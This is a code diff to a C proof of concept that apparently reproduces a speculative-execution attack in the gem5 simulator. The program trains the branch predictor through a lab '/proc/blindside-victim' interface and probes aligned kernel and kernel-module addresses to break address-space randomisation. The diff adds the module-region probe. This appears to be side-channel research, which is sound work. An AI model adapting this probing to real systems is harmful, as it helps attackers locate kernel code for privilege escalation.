@@ -9,9 +9,10 @@
 #include "m5ops.h"
 
 #define PROCFS_NAME "blindside-victim"
-#define NUM_TRAIN 5
+#define NUM_TRAIN 1
 
 #define START_KERNEL 0xffffffff80000000
+#define START_KERNEL_MODULE 0xffffffffc0000000
 #define ALIGN 0x2000000
 #define NUM_OFFSETS 32
 
@@ -33,7 +34,7 @@ static inline void call_kernel(int kernel_fd, uint64_t test_addr, uint64_t idx) 
 }
 
 
-void test_one_address(int kernel_fd, size_t test_addr, size_t round) {
+void test_one_address(int kernel_fd, size_t test_addr) {
     uint64_t i;
 
     // Train the branch predictor
@@ -51,11 +52,13 @@ void test_one_address(int kernel_fd, size_t test_addr, size_t round) {
 }
 
 int main(int argc, char *argv[]) {
-    uint64_t i;
+    uint64_t i = 0;
     char *end;
     int kernel_fd;
+    int probe_module = 0;
     uint64_t entry_syscall_64 = 0x600010;
-    uint64_t gadget_relative_dist = entry_syscall_64;
+    uint64_t module_rela_dist = 0x3;
+//    uint64_t gadget_relative_dist;
 
     kernel_fd = open("/proc/" PROCFS_NAME, O_RDWR);
     if (kernel_fd < 0) {
@@ -63,14 +66,28 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }
 
+    if (argc > 1) {
+        probe_module = atoi(argv[1]);
+    }
+
 #ifdef TEST_ONE
-    if (argc != 0) {
-        i = strtoull(argv[1], &end, 10);
-        test_one_address(kernel_fd, START_KERNEL + gadget_relative_dist + i * ALIGN, i);
+    if (argc > 2) {
+        i = strtoull(argv[2], &end, 10);
+    }
+    if (probe_module) {
+        test_one_address(kernel_fd, START_KERNEL_MODULE + module_rela_dist + i * ALIGN);
+    } else {
+        test_one_address(kernel_fd, START_KERNEL + entry_syscall_64 + i * ALIGN);
     }
 #else
-    for (i = 0; i < NUM_OFFSETS; i++) {
-        test_one_address(kernel_fd, START_KERNEL + gadget_relative_dist + i * ALIGN, i);
+    if (probe_module) {
+        for (i = 0; i < NUM_OFFSETS; i++) {
+            test_one_address(kernel_fd, START_KERNEL_MODULE + module_rela_dist + i * ALIGN);
+        }
+    } else {
+        for (i = 0; i < NUM_OFFSETS; i++) {
+            test_one_address(kernel_fd, START_KERNEL + entry_syscall_64 + i * ALIGN);
+        }
     }
 #endif
 }
